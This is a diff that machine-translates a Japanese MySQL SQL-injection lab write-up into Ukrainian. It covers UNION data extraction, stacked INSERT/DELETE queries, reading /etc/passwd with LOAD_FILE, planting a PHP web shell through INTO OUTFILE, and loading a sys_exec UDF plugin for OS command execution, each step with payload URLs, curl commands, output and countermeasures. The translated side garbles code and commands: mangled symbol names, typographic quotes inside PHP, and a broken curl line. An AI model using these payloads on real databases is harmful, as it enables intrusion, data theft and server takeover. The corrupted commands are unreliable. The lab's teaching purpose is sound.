@@ -4,29 +4,26 @@
 
 <!-- code_chunk_output -->
 
-- [Normal request](#normal-request)
-- [Query log](#query-log)
-- [Basic SQL Injection](#basic-sql-injection)
-- [LOAD_FILE - Read file](#load_file-read-file)
-  - [前提条件](#前提条件)
-  - [手順](#手順)
-    - [Step 1: LOAD_FILEでファイルを読み出す](#step-1-LOAD_FILEでファイルを読み出す)
-  - [対策](#対策)
-- [INTO OUTFILE - Write a PHP file to RCE](#into-outfile-write-a-php-file-to-rce)
-  - [前提条件](#前提条件-1)
-  - [手順](#手順-1)
-    - [Step 1: PHPファイルを `INTO OUTFILE` で書き込む](#step-1-phpファイルを-into-outfile-で書き込む)
-    - [Step 2: PHP経由でOSコマンドを実行する](#step-2-php経由でosコマンドを実行する)
-  - [対策](#対策-1)
-- [UDF - Write a plugin file to RCE](#udf-write-a-plugin-file-to-rce)
-  - [前提条件](#前提条件-2)
-  - [アイデア](#アイデア)
-  - [手順](#手順-2)
-    - [Step 1: プラグインディレクトリを特定する](#step-1-プラグインディレクトリを特定する)
-    - [Step 2: プラグインを書き込む](#step-2-プラグインを書き込む)
-    - [Step 3: プラグインをロードしてUDFを作成する](#step-3-プラグインをロードしてudfを作成する)
-    - [Step 4: UDF経由でOSコマンドを実行する](#step-4-udf経由でosコマンドを実行する)
-  - [対策](#対策-2)
+- [Передумови] (#Передумови)
+  - [Кроки](#Steps)
+    - [Крок 1: Читання файлу за допомогою LOAD_FILE](#Крок-за-кроком)
+  - [Контрзаходи](#Measures)
+- [INTO OUTFILE - записати PHP-файл у RCE](#into-outfile-write-a-php-file-to-rce)
+  - [Передумова](#Передумова-1)
+  - [Кроки](#Кроки-1)
+    - [Крок 1: Запишіть PHP-файл за допомогою `INTO OUTFILE`](#step-1-write-a-php-file-into-outfile-)
+    - [Крок 2: Виконання команд ОС через PHP](#step-2-execute-os-commands-via-php)
+  - [Контрзахід](#measure-1).
+- [UDF - запис файлу плагіна до RCE](#udf-write-a-plugin-file-to-rce)
+  - [Передумови](#Передумова-2)
+  - [ідея](#idea)
+  - [Кроки](#Кроки-2)
+    - [Крок 1: Визначте директорію плагіна](#крок-1 - визначте директорію плагіна)
+    - [Крок 2: Напишіть плагін](#крок-2 - написати плагін)
+    - [Крок 3: Завантажте плагін і створіть UDF](#крок-3-Завантажте плагін і створіть udf)
+    - [Крок 4: Виконання команд os через UDF](#крок-4-виконання команд os через udf)
+  - [Вимірювання](#Вимірювання-2)
+
 
 <!-- /code_chunk_output -->
 
@@ -58,7 +55,7 @@ http://localhost:8888/mysql.php?user=&pass=' UNION ALL SELECT id, username, pass
 ```
 
 
-**複文実行**
+**INSERT та DELETE**
 
 ```
 http://localhost:8888/mysql.php?user=&pass='; INSERT INTO users VALUES (1337, 'pwned', 'hello');--+
@@ -71,59 +68,59 @@ http://localhost:8888/mysql.php?user=&pass='; DELETE FROM users WHERE username='
 
 ## LOAD_FILE - Read file
 
-### 前提条件
+### Обов'язкова умова.
 
-- secure-file-privが無効化されている場合（MySQL 5.7.5以前はデフォルト無効）
+- Якщо secure-file-priv вимкнено (за замовчуванням вимкнено до MySQL 5.7.5).
 
 
-### 手順
+### Крок за кроком.
 
-#### Step 1: LOAD_FILEでファイルを読み出す
+#### Крок 1: Читання файлу за допомогою LOAD_FILE
 
-`load_file`関数を用いることでファイルの内容を読み出すことができる。
+Функція `LOAD_FILE` може бути використана для читання вмісту файлу.
 
-読みだした内容は、UNION SELECT文を使えばクエリの結果として出力させることができる。
+Зчитаний вміст може бути виведено як результат запиту з використанням оператора UNION SELECT.
 
 ```
 http://localhost:8888/mysql.php?user=&pass=' UNION SELECT NULL,NULL,load_file('/etc/passwd');--+
 ```
+
 
 > result:
 >
 > id=, username=, password=root:​x:0:0:root:/root:/bin/bash daemon:​x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:​x:2:2:bin:/bin:/usr/sbin/nologin sys:​x:3:3:sys:/dev:/usr/sbin/nologin sync:​x:4:65534:sync:/bin:/bin/sync games:​x:5:60:games:/usr/games:/usr/sbin/nologin man:​x:6:12:​man:/var/cache/man:/usr/sbin/nologin lp:​x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:​x:8:8:mail:/var/mail:/usr/sbin/nologin news:​x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:​x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:​x:13:13:proxy:/bin:/usr/sbin/nologin www-data:​x:33:33:www-data:/var/www:/usr/sbin/nologin backup:​x:34:34:backup:/var/backups:/usr/sbin/nologin list:​x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:​x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:​x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:​x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:​x:​100:65534::/nonexistent:/usr/sbin/nologin mysql:​x:999:999::/home/mysql:/bin/sh
 
 
-### 対策
+### Контрзаходи.
 
-- secure-file-privオプションを有効化してファイル読み込みを禁止する
-
-
-## INTO OUTFILE - Write a PHP file to RCE
-
-### 前提条件
-
-- MySQLがPHPの公開ディレクトリにアクセスできる場合
-- secure-file-privが無効化されている場合（MySQL 5.7.5以前はデフォルト無効）
+- Заборонити читання файлів, включивши опцію secure-file-priv
 
 
-### 手順
+## INTO OUTFILE - записати PHP-файл до RCE
 
-#### Step 1: PHPファイルを `INTO OUTFILE` で書き込む
+### Необхідна умова.
 
-`INTO OUTFILE`を使用して、WebShellとして動作するPHPコードをPHPファイルとして書き込む。
+- Якщо MySQL має доступ до публічного каталогу PHP
+- Якщо опція secure-file-priv вимкнена (вимкнена за замовчуванням до MySQL 5.7.5)
+
+
+### Кроки.
+
+#### Крок 1: Запишіть PHP-файл за допомогою `INTO OUTFILE`.
+
+Використовуйте `INTO OUTFILE`, щоб записати PHP-код для запуску в WebShell у вигляді PHP-файлу.
 
 ```php
-<?php $param=$_GET["cmd"]; echo shell_exec($param);
+<?php $param=$_GET[«cmd»]; echo shell_exec($param);.
 ```
 
 ```
 http://localhost:8888/mysql.php?user=&pass=' UNION SELECT NULL,NULL,'<?php $param=$_GET["cmd"]; echo shell_exec($param);' INTO OUTFILE '/var/www/html/poc.php
 ```
 
+#### Крок 2: Виконання команд ОС за допомогою PHP
 
-#### Step 2: PHP経由でOSコマンドを実行する
-
-書き込みに成功していれば以下のURLで任意コマンド実行ができる。
+Якщо ви успішно записали файл, ви можете використовувати наступну URL-адресу для виконання будь-якої команди.
 
 ```
 ❯ curl 'http://localhost:8888/poc.php?cmd=id'
@@ -131,73 +128,71 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 
-### 対策
+### Рішення.
 
-- MySQLとWebサーバは分離した構成にする
-- secure-file-privオプションを有効化してファイル書き込みを禁止する
-
-
-## UDF - Write a plugin file to RCE
-
-### 前提条件
-
-- 複文実行できる設定になっている場合
-- プラグインディレクトリにMySQLのプロセスが書き込み可能な場合
+- Розділіть конфігурацію MySQL і веб-сервера.
+- Увімкніть опцію secure-file-priv для заборони запису файлів.
 
 
-### アイデア
+## UDF - Записати файл плагіна в RCE
 
-- MySQLではC言語でプラグインを書いて、独自のSQL関数（UDF）を実装することができる
-- C言語内では当然任意のコードが実行できるので、OSコマンドを実行するUDFを作り出すことも可能
-  - 例. https://www.exploit-db.com/exploits/1518
-- MySQLがプラグインディレクトリに書き込む権限を持っている場合、UDFを含むバイナリを書き込み、プラグインとしてロードさせることで任意コード実行ができる
-- コンパイル済みのOSコマンド実行UDFも世の中に転がっている
-  - 例. https://www.exploit-db.com/exploits/46249
-- MySQLの場合、バイナリファイルはプラグイン用のディレクトリに配置される必要がある
+### Обов'язкова умова.
+
+- Якщо ваша конфігурація дозволяє виконання операторів подвійного запису
+- Якщо каталог плагіна доступний для запису процесам MySQL.
 
 
-### 手順
+### Ідея.
 
-#### Step 1: プラグインディレクトリを特定する
+- MySQL дозволяє писати плагіни на C і реалізовувати власні SQL-функції (UDF).
+- Звичайно, в межах мови C можна виконувати довільний код, тому можна створювати UDF, які виконують команди ОС
+  - Приклад. https://www.exploit-db.com/exploits/1518
+- Якщо MySQL має доступ на запис до каталогу плагінів, довільний код можна виконати, написавши двійковий файл, що містить UDF, і завантаживши його як плагін.
+- Попередньо скомпільовані UDF для виконання команд операційної системи також можна знайти у всьому світі.
+  - Приклад. Приклад: https://www.exploit-db.com/exploits/46249
+- Для MySQL бінарний файл потрібно розмістити в каталозі для плагіна
 
-バイナリファイルをどこに書き込めば良いか調べる。
+### Крок за кроком.
+
+#### Крок 1: Визначте каталог плагіна
+
+Дізнайтеся, куди записати бінарний файл.
 
 ```
-http://localhost:8888/mysql.php?user=&pass=' UNION SELECT @@plugin_dir,'','';--+
+http://localhost:8888/mysql.php?user=&pass=' UNION SELECT @@@plugin_dir,'','';--+
 ```
 
-> result:
+> result:.
 >
 > id=/usr/lib/mysql/plugin/, username=, password=
 
 
-#### Step 2: プラグインを書き込む
+#### Крок 2: Напишіть плагін
 
-[既存のExploitコード](https://www.exploit-db.com/exploits/46249)中に含まれる `shellcode_x64` の値がコンパイル済みのバイナリデータになっている。以下の手順ではこちらの値を流用する。
+Значення `hellcode_x64` в [існуючому коді експлойта](https://www.exploit-db.com/exploits/46249) є скомпільованими двійковими даними. У наступній процедурі використовується це значення.
 
-下記のコマンド内のコメント部分をバイナリデータに置き換える。
+Замініть частину коментаря в наступній команді бінарними даними.
 
-GETリクエストだとURI長の制限に引っかかるため、POSTリクエストで投げる。もし、GETリクエストしか使えない場合は、バイナリファイルを分割してDB内に格納し、後から連結することで制限を回避できる。
+Відправте POST-запит, оскільки GET-запит не може бути виконаний через обмеження на довжину URI. Якщо ви можете використовувати тільки GET-запити, ви можете обійти це обмеження, розбивши двійковий файл, зберігши його в БД і об'єднавши пізніше.
 
 ```
 curl http://localhost:8888/mysql.php \
-  -d 'user=' \
-  -d "pass='; SELECT BINARY /*ここに数値としてバイナリデータを入れる（例. 0x41424344）*/ into dumpfile '/usr/lib/mysql/plugin/mysql_udfsys.so';--+"
+  -d 'user='; S`` curl
+  -d 'pass='; SELECT BINARY /*Вставте тут двійкові дані у вигляді чисел (наприклад. 0x41424344)*/ у файл дампа '/usr/lib/mysql/plugin/mysql_udfsys.so';--+»
 ```
 
+#### Крок 3: Завантажте плагін і створіть UDF
 
-#### Step 3: プラグインをロードしてUDFを作成する
-
-バイナリファイル内の `sys_exec` シンボルの関数がUDFとして実行できるようになる。
+Функція символу `ys_exec` у бінарному файлі може бути виконана як UDF.
 
 ```
 http://localhost:8888/mysql.php?user=&pass='; CREATE FUNCTION sys_exec RETURNS int SONAME 'mysql_udfsys.so';--+
 ```
 
 
-#### Step 4: UDF経由でOSコマンドを実行する
+#### Крок 4: Виконання команд ОС через UDF
 
-コマンド実行結果が分からないので、ファイルに書き込んでコマンド実行の成功を確かめる。
+Оскільки результат виконання команди невідомий, запишіть його у файл, щоб підтвердити успішність виконання команди.
 
 ```
 http://localhost:8888/mysql.php?user=&pass=' UNION SELECT sys_exec('echo PWNED! > /var/www/html/udf_poc'), '', '';--+
@@ -209,8 +204,8 @@ PWNED!
 ```
 
 
-### 対策
+### Виправлення.
 
-- 複文実行を禁止するオプションを有効化するか、sqliなどを使用する
-- MySQLプロセスの権限を必要最小限に絞る
-- secure-file-privオプションを有効化してファイル書き込みを禁止する
+- Увімкніть опцію заборони виконання подвійних інструкцій або використання sqli тощо.
+- Зменшіть привілеї процесу MySQL до мінімально необхідних.
+- Увімкніть опцію secure-file-priv для заборони запису файлів.
